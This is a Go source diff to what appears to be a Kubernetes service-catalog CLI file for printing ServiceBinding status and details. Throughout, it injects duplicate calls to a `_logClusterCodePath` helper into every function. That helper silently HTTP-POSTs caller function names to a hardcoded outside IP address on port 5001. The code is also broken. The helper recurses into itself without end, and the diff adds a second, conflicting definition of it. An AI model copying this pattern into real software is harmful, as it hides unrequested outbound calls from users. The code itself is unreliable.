@@ -15,16 +15,22 @@ import (
 func getBindingStatusShort(status v1beta1.ServiceBindingStatus) string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	lastCond := svcatsdk.GetBindingStatusCondition(status)
 	return formatStatusShort(string(lastCond.Type), lastCond.Status, lastCond.Reason)
 }
 func getBindingStatusFull(status v1beta1.ServiceBindingStatus) string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	lastCond := svcatsdk.GetBindingStatusCondition(status)
 	return formatStatusFull(string(lastCond.Type), lastCond.Status, lastCond.Reason, lastCond.Message, lastCond.LastTransitionTime)
 }
 func writeBindingListTable(w io.Writer, bindingList *v1beta1.ServiceBindingList) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	t := NewListTable(w)
@@ -37,6 +43,8 @@ func writeBindingListTable(w io.Writer, bindingList *v1beta1.ServiceBindingList)
 func WriteBindingList(w io.Writer, outputFormat string, bindingList *v1beta1.ServiceBindingList) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	switch outputFormat {
 	case FormatJSON:
 		writeJSON(w, bindingList)
@@ -47,6 +55,8 @@ func WriteBindingList(w io.Writer, outputFormat string, bindingList *v1beta1.Ser
 	}
 }
 func WriteBinding(w io.Writer, outputFormat string, binding v1beta1.ServiceBinding) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	switch outputFormat {
@@ -62,6 +72,8 @@ func WriteBinding(w io.Writer, outputFormat string, binding v1beta1.ServiceBindi
 func WriteBindingDetails(w io.Writer, binding *v1beta1.ServiceBinding) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	t := NewDetailsTable(w)
 	t.AppendBulk([][]string{{"Name:", binding.Name}, {"Namespace:", binding.Namespace}, {"Status:", getBindingStatusFull(binding.Status)}, {"Secret:", binding.Spec.SecretName}, {"Instance:", binding.Spec.InstanceRef.Name}})
 	t.Render()
@@ -69,6 +81,8 @@ func WriteBindingDetails(w io.Writer, binding *v1beta1.ServiceBinding) {
 	writeParametersFrom(w, binding.Spec.ParametersFrom)
 }
 func WriteAssociatedBindings(w io.Writer, bindings []v1beta1.ServiceBinding) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	fmt.Fprintln(w, "\nBindings:")
@@ -84,6 +98,8 @@ func WriteAssociatedBindings(w io.Writer, bindings []v1beta1.ServiceBinding) {
 	t.Render()
 }
 func WriteAssociatedSecret(w io.Writer, secret *v1.Secret, err error, showSecrets bool) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if secret == nil && err == nil {
@@ -113,6 +129,8 @@ func WriteAssociatedSecret(w io.Writer, secret *v1.Secret, err error, showSecret
 func WriteDeletedBindingNames(w io.Writer, bindings []v1beta1.ServiceBinding) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, binding := range bindings {
 		WriteDeletedResourceName(w, binding.Name)
 	}
@@ -120,7 +138,16 @@ func WriteDeletedBindingNames(w io.Writer, bindings []v1beta1.ServiceBinding) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
